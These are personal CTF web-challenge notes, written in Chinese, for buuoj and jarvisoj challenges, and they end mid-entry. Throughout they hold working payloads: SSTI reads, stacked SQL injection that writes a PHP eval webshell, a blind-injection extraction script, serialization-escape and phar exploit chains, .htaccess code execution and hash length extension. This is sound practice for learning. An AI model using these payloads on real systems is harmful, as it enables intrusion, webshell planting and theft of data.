# web做题笔记

## buuoj



### easy_tornado

tornado是一个python写的web服务器

读取文件hint.txt:` md5(cookie_secret+md5(filename)) `

我们只要找到cookie_secret 就能读取任意文件

直接搜cve:找到一个\r\n分割请求的。。好像搞不到cookie_secret

找到`error?msg=Error`模板注入???

`{{1.}}`出现1.0  九成九模板注入，是什么模板?估计是自己的template

cookie_secret在tornado.web.Application中

黑名单:`",',(,),_,%,*,+,-,/,=,[,],\\,|`

{{ {1,2,3} }}

又是一次思维定势,老想着`__class__`啥的,后来被提醒一下，才意识到拿到cookie_secret并不需要命令执行,完全可以读类来获取信息

有两种比较好的办法找到cookie_secret在哪

- 写个脚本,把所有的类跑一边
- 读代码找到可疑的类

最后的payload:`{{handler.application.settings}}`

` 'cookie_secret': 'f680f1d4-b940-40c2-9f82-0b1832c64479' `





### 随便注

禁用`return preg_match("/select|update|delete|drop|insert|where|\./i",$inject);`

emmmm还有creater...

查询语句类似:`select xxx from xxx where xxx='1'`

测试清单:

```
1#  没有闭合单引号却有查询结果
1""""""" 可以查询到,猜测过滤了"

0' "o"r 1#
check the manual that corresponds to your MariaDB server version for the right syntax to use near 'r 1#'' at line 1</pre>
正常的报错
check the manual that corresponds to your MariaDB server version for the right syntax to use near '"o"r 1' at line 1
////单纯的想多了
extractvalue(1, concat(0x7e, (database()),0x7e));

```

用报错注入弄出数据库名:supersqli

version:`10.3.18-MariaDB`

host:6e161107d1dd

port:3306

dir:/var/lib/mysql/

可以执行多条语句，

```
show variables like 'general_log';  -- 查看日志是否开启
set global general_log=on; -- 开启日志功能
show variables like 'general_log_file';  -- 看看日志文件保存位置
set global general_log_file='tmp/general.lg'; -- 设置日志文件保存位置
show variables like 'log_output';  -- 看看日志输出类型  table或file
set global log_output='table'; -- 设置输出类型为 table
set global log_output='file';   -- 设置输出类型为file

```

这些命令都可以执行

试着写个webshell

`1';set global general_log_file=0x2F7661722F7777772F68746D6C2F72652E706870;#`

`1';set global general_log=on;`

 webshell:Access denied. 

草,用prepare执行预定义sql语句/////为啥我搜不到....

```mysql
1';Set @sql=concat("s","elect '<?php @eval($_POST[a]);?>' into outfile '/var/www/html/44",char(46),"php'");PREPARE sqla from @sql;EXECUTE sqla;
```





### warmup



```php

<?php
    highlight_file(__FILE__);
    class emmm
    {
        public static function checkFile(&$page)
        {
            $whitelist = ["source"=>"source.php","hint"=>"hint.php"];
            if (! isset($page) || !is_string($page)) {
                echo "you can't see it";
                return false;
            }

            if (in_array($page, $whitelist)) {
                return true;
            }

            $_page = mb_substr(
                $page,
                0,
                mb_strpos($page . '?', '?')
            );
            if (in_array($_page, $whitelist)) {
                return true;
            }

            $_page = urldecode($page);
            $_page = mb_substr(
                $_page,
                0,
                mb_strpos($_page . '?', '?')
            );
            if (in_array($_page, $whitelist)) {
                return true;
            }
            echo "you can't see it";
            return false;
        }
    }

    if (! empty($_REQUEST['file'])
        && is_string($_REQUEST['file'])
        && emmm::checkFile($_REQUEST['file'])
    ) {
        include $_REQUEST['file'];
        exit;
    } else {
        echo "<br><img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />";
    }  
?>
```



```php

 $_page = mb_substr(
                $_page,
                0,
                mb_strpos($_page . '?', '?')
            );
            if (in_array($_page, $whitelist)) {
                return true;
            }
```



这里有个逻辑漏洞,如果我们构造`hint.php?`那么后面的内容随我们控制用../xxx来读取

`hint.php?/../ffffllllaaaagggg`

读取失败//////

emmmmmm,flag在根目录

### easysql

猜测sql语句类似:`select xx from xx where xx=query`

`select query from xxxx;`

输出:

too long,nonono,结果

长度限制:40

黑名单:`sleep,or,",from,where,outfile`

奇怪的输出

`123`=>`1`

`123#`=>`123`

由这两个可以猜测sql语句类似

`select query from xxxx;`

`database();select%201%23`

结果

```
Array
(
    [0] => ctf
)
Array
(
    [0] => 1
)
```

可以执行多个sql语句,可以试着用prepare绕过黑名单////禁用from................

`1;show%20databases%23`

```

Array
(
    [0] => 1
)
Array
(
    [0] => ctf
)
Array
(
    [0] => ctftraining
)
Array
(
    [0] => information_schema
)
Array
(
    [0] => mysql
)
Array
(
    [0] => performance_schema
)
Array
(
    [0] => test
)
```



可在了禁了from上

后来看到` Give me your flag, I will tell you if the flag is right. `

并且flag存在表里,所以应该有from Flag

构造payload :`*,1`

### 高明的黑客

题目提供的文件却是在网站上,但是不知道哪里能命令执行



还有网站的配置也很奇怪



写个脚本把所有GET参数爆破一遍得到shell





### ssrf_me

```python
#! /usr/bin/env python
#encoding=utf-8
from flask import Flask
from flask import request
import socket
import hashlib
import urllib
import sys
import os
import json
reload(sys)
sys.setdefaultencoding('latin1')

app = Flask(__name__)

secert_key = os.urandom(16)


class Task:
    def __init__(self, action, param, sign, ip):
        self.action = action
        self.param = param
        self.sign = sign
        self.sandbox = md5(ip)
        if(not os.path.exists(self.sandbox)):          #SandBox For Remote_Addr
            os.mkdir(self.sandbox)

    def Exec(self):
        result = {}
        result['code'] = 500
        if (self.checkSign()):
            if "scan" in self.action:
                tmpfile = open("./%s/result.txt" % self.sandbox, 'w')
                resp = scan(self.param)
                if (resp == "Connection Timeout"):
                    result['data'] = resp
                else:
                    print resp
                    tmpfile.write(resp)
                    tmpfile.close()
                result['code'] = 200
            if "read" in self.action:
                f = open("./%s/result.txt" % self.sandbox, 'r')
                result['code'] = 200
                result['data'] = f.read()
            if result['code'] == 500:
                result['data'] = "Action Error"
        else:
            result['code'] = 500
            result['msg'] = "Sign Error"
        return result

    def checkSign(self):
        if (getSign(self.action, self.param) == self.sign):
            return True
        else:
            return False


#generate Sign For Action Scan.
@app.route("/geneSign", methods=['GET', 'POST'])
def geneSign():
    param = urllib.unquote(request.args.get("param", ""))
    action = "scan"
    return getSign(action, param)


@app.route('/De1ta',methods=['GET','POST'])
def challenge():
    action = urllib.unquote(request.cookies.get("action"))
    param = urllib.unquote(request.args.get("param", ""))
    sign = urllib.unquote(request.cookies.get("sign"))
    ip = request.remote_addr
    if(waf(param)):
        return "No Hacker!!!!"
    task = Task(action, param, sign, ip)
    return json.dumps(task.Exec())
@app.route('/')
def index():
    return open("code.txt","r").read()


def scan(param):
    socket.setdefaulttimeout(1)
    try:
        return urllib.urlopen(param).read()[:50]
    except:
        return "Connection Timeout"



def getSign(action, param):
    return hashlib.md5(secert_key + param + action).hexdigest()


def md5(content):
    return hashlib.md5(content).hexdigest()


def waf(param):
    check=param.strip().lower()
    if check.startswith("gopher") or check.startswith("file"):
        return True
    else:
        return False


if __name__ == '__main__':
    app.debug = False
    app.run(host='0.0.0.0')
```

hint:flag in ./flag



#### 难点一:无法直接利用geneSign来获得read操作的sign值



分析代码发现我们需要sign才能执行scan或者read操作，

但是他们只提供给了我们scan操作,却没有read操作的sign,也就是说我们只能确定是否能访问我们提供的url。



我们观察

```python
    param = urllib.unquote(request.args.get("param", ""))
    action = "scan"
    return hashlib.md5(secert_key + param + action).hexdigest()
```

发现param和action连在一起且param可控,再加上检查`if "read" in self.action` 是用in 来检查的,所以我们可以把read放在url里面，这样我们就能读取内容了

#### 难点二:urlopen函数名的误导



刚开始以为是用今年爆出来的urllib CLRF的漏洞结合redis拿到shell

可是看了一下6379端口好像，没有运行redis

看了wp后发现还可以直接读文件????

![image.png](https://ws1.sinaimg.cn/large/006pWR9agy1g9e4mj3qjuj30j70dd756.jpg)

emmm是我对urllib.urlopen的了解不够深

>  `urllib.urlopen`(*url*[, *data*[, *proxies*[, *context*]]]) 
>
>Open a network object denoted by a URL for reading. If **the URL does not have a scheme identifier**, or if it has `file:` as its scheme identifier, **this opens a local file (without [universal newlines](https://docs.python.org/2/glossary.html#term-universal-newlines))**; otherwise it opens a socket to a server somewhere on the network. If the connection cannot be made the [`IOError`](https://docs.python.org/2/library/exceptions.html#exceptions.IOError) exception is raised. If all went well, a file-like object is returned. This supports the following methods: `read()`, [`readline()`](https://docs.python.org/2/library/readline.html#module-readline), `readlines()`, `fileno()`, `close()`, `info()`, `getcode()` and `geturl()`. It also has proper support for the [iterator](https://docs.python.org/2/glossary.html#term-iterator) protocol. One caveat: the `read()` method, if the size argument is omitted or negative, may not read until the end of the data stream; there is no good way to determine that the entire stream from a socket has been read in the general case. 







### Hack World

> All You Want Is In Table 'flag' and the column is 'flag'

过滤:`+,#,-,反引号,*,空格,`

`id=2/2`=>`id=1`,注入参数为数字,不需要逃逸引号

`2/sleep(3)` => sleep 3s



`if(substr(hex((select(flag)from(flag))),1,1)>0,9999,1)`

成功回显`Error Occured When Fetch Result.`,失败回显`need girl friend`

```python

import requests
import time
burp0_url = "http://fb5adfb5-4ffa-47bb-a286-32e821c46a6a.node3.buuoj.cn:80/index.php"
burp0_headers = {"Cache-Control": "max-age=0", "Origin": "http://fb5adfb5-4ffa-47bb-a286-32e821c46a6a.node3.buuoj.cn", "Upgrade-Insecure-Requests": "1", "Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3", "Referer": "http://fb5adfb5-4ffa-47bb-a286-32e821c46a6a.node3.buuoj.cn/", "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7", "Connection": "close"}
burp0_data = {"id": "if(substr(hex((select(flag)from(flag))),1,1)=char(a),1111,1)"}
requests.post(burp0_url, headers=burp0_headers, data=burp0_data)

result=""
alnlist="0123456789ABCDEF"
i=len(result)
while True:
    for j in alnlist:
        burp0_data = {"id": "if(substr(hex((select(flag)from(flag))),{},1)=char({}),1111,1)".format(i+1,ord(j))}
        res=requests.post(burp0_url, headers=burp0_headers, data=burp0_data)
        if "Error Occured When Fetch Result." in res.text:
            result+=j
            print(result)
            break
        time.sleep(0.5)
    i+=1


```



flag{f475e0ca-7337-4331-b968-13555bb2d874}



### fakebook

>[19:15:02] 200 -    1KB - /login.php
>[19:16:56] 200 -   37B  - /robots.txt
>[19:18:26] 200 -    0B  - /user.php
>[19:18:36] 200 - 1019B  - /view.php

查看robots.txt得到user.php.bak



数据库名:` fakebook,information_schema,mysq  l,performance_schema,test `

表名:` fakebook: users`

列名:` no,username,passwd,data,USER,CURRENT_CONNECTIONS,TOTAL_CONNEC`

//没有管理员账号

叫我们ssrf?

看了一下正则,发现好像没啥机会,思路到这里就断了



查看data发现是反序列化后的数据,那么可以猜测view.php是从数据库中取出序列化后的内容对其进行反序列化再显示内容

用union来让view.php反序列化我们提供的内容

但是union select 被过滤了,用union all select 来绕过

最后的payload

`http://03cd35f0-7b3a-4e24-a2ba-cb1e9d4d944c.node3.buuoj.cn/view.php?no=6666 union all select 1,2,3,'O%3A8%3A"UserInfo"%3A3%3A{s%3A4%3A"name"%3Bs%3A4%3A"evil"%3Bs%3A3%3A"age"%3Bi%3A0%3Bs%3A4%3A"blog"%3Bs%3A29%3A"file%3A%2F%2F%2Fvar%2Fwww%2Fhtml%2Fflag.php"%3B}' `



### piapiapia

>[20:44:48] 200 -  392KB - /www.zip
>
>[20:44:15] 403 -  571B  - /upload/



拿到代码后审计发现sql过滤还是很严格的没法逃脱单引号

但是我们注意到了

```php
public function filter($string) {
		$escape = array('\'', '\\\\');
		$escape = '/' . implode('|', $escape) . '/';
		$string = preg_replace($escape, '_', $string);

		$safe = array('select', 'insert', 'update', 'delete', 'where');
		$safe = '/' . implode('|', $safe) . '/i';
		return preg_replace($safe, 'hacker', $string);
	}


public function update_profile($username, $new_profile) {
		$username = parent::filter($username);
		$new_profile = parent::filter($new_profile);

		$where = "username = '$username'";
		return parent::update($this->table, 'profile', $new_profile, $where);
	}



$user->update_profile($username, serialize($profile));
```



这三个东西碰到一起后会发现神奇的事情

fileter将`where`替换为`hacker`后,会溢出一个字符,而where是在反序列化里的

`s:6:"where""`=>`s:6:"hacker""`这样就可以成功逃逸出序列化,修改序列化的内容

继续跟踪profile发现`$photo  = base64_encode(file_get_contents($profile['photo']));`

这样我们就可以任意读取文件了

还有一个小问题需要解决


```php

if($_POST['phone'] && $_POST['email'] && $_POST['nickname'] && $_FILES['photo']) {

		$username = $_SESSION['username'];
		if(!preg_match('/^\d{11}$/', $_POST['phone']))
			die('Invalid phone');

		if(!preg_match('/^[_a-zA-Z0-9]{1,10}@[_a-zA-Z0-9]{1,10}\.[_a-zA-Z0-9]{1,10}$/', $_POST['email']))
			die('Invalid email');
		
		if(preg_match('/[^a-zA-Z0-9_]/', $_POST['nickname']) || strlen($_POST['nickname']) > 10)
			die('Invalid nickname');

		$file = $_FILES['photo'];
		if($file['size'] < 5 or $file['size'] > 1000000)
			die('Photo size error');

		move_uploaded_file($file['tmp_name'], 'upload/' . md5($file['name']));
		$profile['phone'] = $_POST['phone'];
		$profile['email'] = $_POST['email'];
		$profile['nickname'] = $_POST['nickname'];
		$profile['photo'] = 'upload/' . md5($file['name']);

		$user->update_profile($username, serialize($profile));
		echo 'Update Profile Success!<a href="profile.php">Your Profile</a>';
	}

```



这里对输入内容都有正则过滤,但是如果我们传入数组就可以绕过正则匹配

最后的payload:

```
POST /update.php HTTP/1.1
Host: 6c42e2f6-f6cf-40c9-a1bf-ef7c57418b22.node3.buuoj.cn
Content-Length: 711
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36
Origin: http://6c42e2f6-f6cf-40c9-a1bf-ef7c57418b22.node3.buuoj.cn
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryj2Bi57wuJTQvgVXE
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
Referer: http://6c42e2f6-f6cf-40c9-a1bf-ef7c57418b22.node3.buuoj.cn/update.php
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: PHPSESSID=b86493a015084e5774751fd0b405fbf3
Connection: close

------WebKitFormBoundaryj2Bi57wuJTQvgVXE
Content-Disposition: form-data; name="phone"

01234567891
------WebKitFormBoundaryj2Bi57wuJTQvgVXE
Content-Disposition: form-data; name="email"

1127@qq.com
------WebKitFormBoundaryj2Bi57wuJTQvgVXE
Content-Disposition: form-data; name="nickname[]"

wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere";}s:5:"photo";s:10:"config.php";}
------WebKitFormBoundaryj2Bi57wuJTQvgVXE
Content-Disposition: form-data; name="photo"; filename="aaaa"
Content-Type: application/octet-stream

aaaaa
------WebKitFormBoundaryj2Bi57wuJTQvgVXE--

```





### Dropbox

用download.php发现可以任意文件下载但是用open_basedir限制了目录,猜测flag再根目录(/flag.txt)

题目提示phar,分析一下,最后是要用File的close()来读取文件

魔术方法

```php
FileList : __call	__destruct
User : __destruct
```



User->FileList(`__call`)->File(`close`)



```php
<?php
class User {
    public $db;
    public function __construct()
    {
        $this->db=new FileList();
    }
}

class FileList {
    private $files;
    private $results;
    private $funcs;

    public function __construct() {
        $file=new File();
        $this->files=array($file);
        $this->results=array();
        $this->funcs=array();
    }

    public function __call($func, $args) {
        array_push($this->funcs, $func);
        foreach ($this->files as $file) {
            $this->results[$file->name()][$func] = $file->$func();
        }
    }

}
class File {
    public $filename="/flag.txt";
}

$a=new User();
@unlink("phar.phar");
$phar = new Phar("phar.phar"); //后缀名必须为phar,phar伪协议不用phar后缀
$phar->startBuffering();
$phar->setStub("<?php __HALT_COMPILER(); ?>");

$phar->setMetadata($a); //将自定义的meta-data存入manifest
$phar->addFromString("test.txt", "test"); //添加要压缩的文件
//签名自动计算
$phar->stopBuffering();


?>
```



### ikun



修改account参数可以修改价格

爬虫找到lv6,修改account购买进入b1g_m4mber



爆破jwt的密钥为`1Kun`,进入管理员后台

```html
<!-- 潜伏敌后已久,只能帮到这了 -->
<a href="/static/asd1f654e683wq/www.zip" ><span style="visibility:hidden">删库跑路前我留了好东西在这里</span></a>
<div class="ui segments center padddd">
<!-- 对抗*站黑科技，目前为测试阶段，只对管理员开放 -->
```



拿到网站源码

### online tool

```php
<?php

if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $_SERVER['REMOTE_ADDR'] = $_SERVER['HTTP_X_FORWARDED_FOR'];
}

if(!isset($_GET['host'])) {
    highlight_file(__FILE__);
} else {
    $host = $_GET['host'];
    $host = escapeshellarg($host);
    $host = escapeshellcmd($host);
    $sandbox = md5("glzjin". $_SERVER['REMOTE_ADDR']);
    echo 'you are in sandbox '.$sandbox;
    @mkdir($sandbox);
    chdir($sandbox);
    echo system("nmap -T5 -sT -Pn --host-timeout 2 -F ".$host);
}
```

escapeshellarg+escapeshellcmd组合导致参数注入

但是这题我的思考方向错了,一直想着找个参数命令执行,但是其实找个参数写文件就ok了

还有一个地方,就是我没有认真分析执行过程,一直以大概来进行思考,导致自己的一些思路也没有实现,像利用参数读取文件,文件是读取成功了,但是写到文件里去了,我要傻逼逼的在等页面回显,如果我认真分析一下这题也能找到对的思路





### Unicore shop

 https://github.com/hyperreality/ctf-writeups/tree/master/2019-asis 

后端:tornado

```
<meta charset="utf-8"><!--Ah,really important,seriously. -->


```





24:`id = self.get_argument('id')`

25:`price = str(self.get_argument('price'))`

34:`unicodedata.numeric(price)`

我们发现第4个商品要1000+而我们只能输入一个字符

通过报错我们看到`unicodedata.numeric(price)`

这个会把unicode的字符转成数字,如果有这么一个字符他代表1000以上的数字时,我们就可以拿到flag,百度一翻后,我们发现还真有,最后拿到flag



 https://www.compart.com/en/unicode/search?q=thousand#characters 



### shrine

```python


import flask
import os

app = flask.Flask(__name__)

app.config['FLAG'] = os.environ.pop('FLAG')


@app.route('/')
def index():
    return open(__file__).read()


@app.route('/shrine/<path:shrine>')
def shrine(shrine):

    def safe_jinja(s):
        s = s.replace('(', '').replace(')', '')
        blacklist = ['config', 'self']
        return ''.join(['{{% set {}=None%}}'.format(c) for c in blacklist]) + s

    return flask.render_template_string(safe_jinja(shrine))


if __name__ == '__main__':
    app.run(debug=True)

```



禁了括号和config和`__self__`,也就是不能命令执行

flag在config里,也就是说我们要找到config

刚开始不知道有啥没想到request,就一直在看`"".__class__`里翻来翻去,后来想到request就试了一下发现好东西

`{{request.__class__.__mro__[-3].__dict__['json_module'].__dict__['current_app'].__dict__['config']}}`拿到flag

 https://dormousehole.readthedocs.io/en/latest/templating.html 





### web1

广告申请广告名处存在sql注入,但是用union select 一直提示段数量不对,试了10多次后放弃了

过滤报错注入,or,猜测后端是`str_replace("xxxxxx","+","")`然后判断or是否在里面

消去空格,+

php5.6尝试截断攻击,在申请广告处无效

sql长度截断登陆admin账号,但是没用



最后看wp发现tm有20+的字段(写脚本写到一半就放弃了),至于or被过滤无法查询字段名等,可以用

```mysql
select * from flags where id='abcdd' union select 1,(select group_concat(b,e,f,g) from ( select 1 as e,2 as f,3 as g,4 as b union select*from flags) x ),3,4;
```

来查询,现在就差表名了

因为这是mariadb,可以用https://mariadb.com/kb/en/library/mysqlinnodb_table_stats/来查询表名





### love math



```php
<?php
error_reporting(0);
//听说你很喜欢数学，不知道你是否爱它胜过爱flag
if(!isset($_GET['c'])){
    show_source(__FILE__);
}else{
    //例子 c=20-1
    $content = $_GET['c'];
    if (strlen($content) >= 80) {
        die("太长了不会算");
    }
    $blacklist = [' ', '\t', '\r', '\n','\'', '"', '`', '\[', '\]'];
    foreach ($blacklist as $blackitem) {
        if (preg_match('/' . $blackitem . '/m', $content)) {
            die("请不要输入奇奇怪怪的字符");
        }
    }
    //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp
    $whitelist = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh'];
    preg_match_all('/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/', $content, $used_funcs);  
    foreach ($used_funcs[0] as $func) {
        if (!in_array($func, $whitelist)) {
            die("请不要输入奇奇怪怪的函数");
        }
    }
    //帮你算出答案
    eval('echo '.$content.';');
}
```





c中只能出现部分字符,或者白名单中的单词

查看白名单中的每一个函数发现baseconvert可以绕过字母和无引号的限制(刚开始没有认真导致自己卡住了很久)

```
baseconvert
返回一字符串，包含 number 以 tobase 进制的表示。number 本身的进制由 frombase 指定。frombase 和 tobase 都只能在 2 和 36 之间（包括 2 和 36）。高于十进制的数字用字母 a-z 表示，例如 a 表示 10，b 表示 11 以及 z 表示 35。 
```

`$pi=base_convert;$pi(55490343972,10,36)();`

字符扩展到a-z0-9,用system看了一下当前目录,没有,

想要看根目录,发现长度不够(/和空格)

于是利用^来生成`_GET`,得到`system($_GET)`



最后的payload:`$pi=base_convert;$pi(1751504350,10,36)(${$pi(1115654,10,36)^((100).(1))}{1});`



### EasyWeb



#### 第一步 命令执行

```php
<?php
function get_the_flag(){
    // webadmin will remove your upload file every 20 min!!!! 
    $userdir = "upload/tmp_".md5($_SERVER['REMOTE_ADDR']);
    if(!file_exists($userdir)){
    mkdir($userdir);
    }
    if(!empty($_FILES["file"])){
        $tmp_name = $_FILES["file"]["tmp_name"];
        $name = $_FILES["file"]["name"];
        $extension = substr($name, strrpos($name,".")+1);
    if(preg_match("/ph/i",$extension)) die("^_^"); 
        if(mb_strpos(file_get_contents($tmp_name), '<?')!==False) die("^_^");
    if(!exif_imagetype($tmp_name)) die("^_^"); 
        $path= $userdir."/".$name;
        @move_uploaded_file($tmp_name, $path);
        print_r($path);
    }
}

$hhh = @$_GET['_'];

if (!$hhh){
    highlight_file(__FILE__);
}

if(strlen($hhh)>18){
    die('One inch long, one inch strong!');
}

if ( preg_match('/[\x00- 0-9A-Za-z\'"\`~_&.,|=[\x7F]+/i', $hhh) )
    die('Try something else!');

$character_type = count_chars($hhh, 3);
if(strlen($character_type)>12) die("Almost there!");

eval($hhh);
?>
```



看样子是要调用`get_the_flag`这个函数,再进行下一步

可用字符:

```
!#$%()*+-/:;<>?@\]^{}\x80-\xff
```

看这些字符,觉得最有可能的突破点是`$`

关于变量名有以下正则

`[a-zA-Z_\x7f-\xff][a-zA-Z0-9_\x7f-\xff]*`

还有可变变量:`${'_GET'}=$_GET`

先以执行任意一个命令为目标



看到`^`再结合`\x80-\xff`就可以构造任何语句了

构造类似`'(%ff%ff%ff%ff%ff^%xxxxxxxxxx)();'`来执行命令,但是这样的话函数名必须小于7个



冥思苦想最后把上面三个结合在一起得到:

`_=${%A0%B8%BA%AB^%ff%ff%ff%ff}{%ff}();`=>`$_GET['\xff']();`



#### 第二步 文件上传



进入下一步,文件上传

```php
function get_the_flag(){
    // webadmin will remove your upload file every 20 min!!!! 
    $userdir = "upload/tmp_".md5($_SERVER['REMOTE_ADDR']);
    if(!file_exists($userdir)){
    mkdir($userdir);
    }
    if(!empty($_FILES["file"])){
        $tmp_name = $_FILES["file"]["tmp_name"];
        $name = $_FILES["file"]["name"];
        $extension = substr($name, strrpos($name,".")+1);
    if(preg_match("/ph/i",$extension)) die("^_^"); 
        if(mb_strpos(file_get_contents($tmp_name), '<?')!==False) die("^_^");
    if(!exif_imagetype($tmp_name)) die("^_^"); 
        $path= $userdir."/".$name;
        @move_uploaded_file($tmp_name, $path);
        print_r($path);
    }
}
```



对文件的后缀名进行了限制:`不能以ph结尾`

对内容进行了限制:`不能出现<?`

根据phpinfo得到的信息

```
版本:7.2.19
中间件:Apache/2.4.29 

```

想到了用.htaccess/.user.ini文件来绕过,但是前面不得不附加内容(exif_imagetype)

于是尝试寻找文件头是htaccess注释符(#和\x00)的图片类型

根据[源代码]( https://github.com/php/php-src/blob/e219ec144ef6682b71e135fd18654ee1bb4676b4/ext/standard/image.c )发现`wbmp`的文件头是\x00\x00刚好符合我们的需求

还有一个需要绕过的地方:对上传内容的限制,php7关闭asptag了,所以无法用<% %>来绕过

后来找到一题类似的( https://xz.aliyun.com/t/3937 ),boarden my eye (是这样的把///)

利用php伪协议+auto_append_file来绕过`<?`的限制



```
\x00\x00
AddType application/x-httpd-php .wuwu
php_value auto_append_file "php://filter/convert.base64-decode/resource=shell.wuwu"
```





#### 第三步 绕过open_basedir



php7.x,emmm还用说吗

 https://github.com/mm0r1/exploits/tree/master/php7-gc-bypass 

走你



## jarvisoj

### re?

看wp。

百度一下发现udf(user defined function)是mysql的自定义函数

所以要导入到mysql中。

步骤

```mysql
> show variables like "%plugin%";
+---------------+------------------------+
| Variable_name | Value                  |
+---------------+------------------------+
| plugin_dir    | /usr/lib/mysql/plugin/ |
+---------------+------------------------+

把 udf.so 移到该目录下

> create function help_me returns string soname 'udf.so';
> select help_me();
+---------------------------------------------+
| help_me()                                   |
+---------------------------------------------+
| use getflag function to obtain your flag!!  |
+---------------------------------------------+

> create function getflag returns string soname 'udf.so';
> select getflag();
+------------------------------------------+
| getflag()                                |
+------------------------------------------+
| PCTF{Interesting_U5er_d3fined_Function}  |
+------------------------------------------+

> drop function help_me;
> drop function getflag;
```



###  flag在管理员手上

扫目录发现源代码的vim交换文件

vim -r 还原

得到

```php

<!DOCTYPE html>
<html>
<head>
<title>Web 350</title>
<style type="text/css">
        body {
                background:gray;
                text-align:center;
        }
</style>
</head>

<body>
        <?php
                $auth = false;
                $role = "guest";
                $salt =
                if (isset($_COOKIE["role"])) {
                        $role = unserialize($_COOKIE["role"]);
                        $hsh = $_COOKIE["hsh"];
                        if ($role==="admin" && $hsh === md5($salt.strrev($_COOKIE["role"]))) {
                                $auth = true;
                        } else {
                                $auth = false;
                        }
                } else {
                        $s = serialize($role);
                        setcookie('role',$s);
                        $hsh = md5($salt.strrev($s));
                        setcookie('hsh',$hsh);
                }
                if ($auth) {
                        echo "<h3>Welcome Admin. Your flag is 
                } else {
                        echo "<h3>Only Admin can see the flag!!</h3>";
                }
        ?>
        
</body>
</html>

```

典型的哈希长度扩展攻击

唯一不确定的就是密钥长度,写个脚本爆破

```python
#!/usr/bin/env python
import os
import requests
import urllib
def rev(s):
	s=eval("'"+s+"'")
	return urllib.quote(s[::-1])

for i in range(128):
	print(123)
	tmp=os.popen("hashpump -s 3a4727d57463f122833d9e732f94e4e0 --data "+'\'s:5:"guest";\''[::-1]+' -a '+'\'s:5:"admin";\''[::-1]+" -k "+str(i)).readlines()
	print("hashpump -s 3a4727d57463f122833d9e732f94e4e0 -d "+'\'s:5:"guest";\''[::-1]+' -a '+'s:5:"admin";'[::-1]+" -k "+str(i))
	hsh=tmp[0].replace('\n','')
	role=rev(tmp[1].replace('\n',''))
	cookie={'hsh':hsh,'role':role}
	text=requests.get("http://web.jarvisoj.com:32778/",cookies=cookie).text
	if 'CTF' in text :
		print(text)
		break
	print(cookie)

```



### api调用

请设法获得目标机器/home/ctf/flag.txt中的flag值。

![image.png](https://i.loli.net/2019/10/08/DEJCarH2Wi8jsTF.png)



点击按钮发生:

```json
function send(){
 evil_input = document.getElementById("evil-input").value;
 var xhr = XHR();
     xhr.open("post","/api/v1.0/try",true);
     xhr.onreadystatechange = function () {
         if (xhr.readyState==4 && xhr.status==201) {
             data = JSON.parse(xhr.responseText);
             tip_area = document.getElementById("tip-area");
             tip_area.value = data.task.search+data.task.value;
         }
     };
     xhr.setRequestHeader("Content-Type","application/json");
     xhr.send('{"search":"'+evil_input+'","value":"own"}');
}
```



向这个api请求。想了半天,试各种非法输入,长度限制都没用,中间猜测xxe,,虽然有了思路但是却无从下手,看到flask又想到模板注入,还是无处下手



最后看了wp,把请求头`Content-Type: application/json`改为

`Content-Type: application/xml`来进行xxe,我也是醉了/fad



### chopper

感觉这题有点傻逼

```
小明入侵了一台web服务器并上传了一句话木马，但是，管理员修补了漏洞，更改了权限。更重要的是：他忘记了木马的密码！你能帮助他夺回控制权限吗？

关卡入口：http://web.jarvisoj.com:32782/
```

抓包，扫目录,然后发现了proxy.php

admin目录源码提示只有202.5.19.128才能访问

proxy.php是标准的ssrf,访问202.5.19.128

```javascript
	var url = <br />
<b>Notice</b>:  Undefined variable: url in <b>/opt/lampp/htdocs/index.php</b> on line <b>17</b><br />
'';
	if(window.dialogArguments)
		url = window.dialogArguments[1];
	var str = '';
	str += '<frameset rows="*, 25" cols="*" framespacing="0" frameborder="0" border="0" id="window_open_frame">';
	str += '<frame name="contentFrame" src="'+url+'" scrolling="auto" noresize>';
	str += '</frameset><noframes></noframes>';
	document.write(str);
```

没有用,无法进行ssrf

然后扫202.5.19.128的目录发现了1.php.....和index.php一样

利用报错得知是用curl来访问url的,并得到了文件的绝对路径

尝试用file://协议来读取文件,发现被过滤

后来弄着弄着想,会不会对GET和POST的处理方式不一样....还真是

成功利用file://localhost/opt/lampp/htdocs/proxy.php读取到文件

接着利用这个扫admin目录

找到

```
User-agent: *
Disallow:trojan.php
Disallow:trojan.php.txt
```



trojan.php

```php
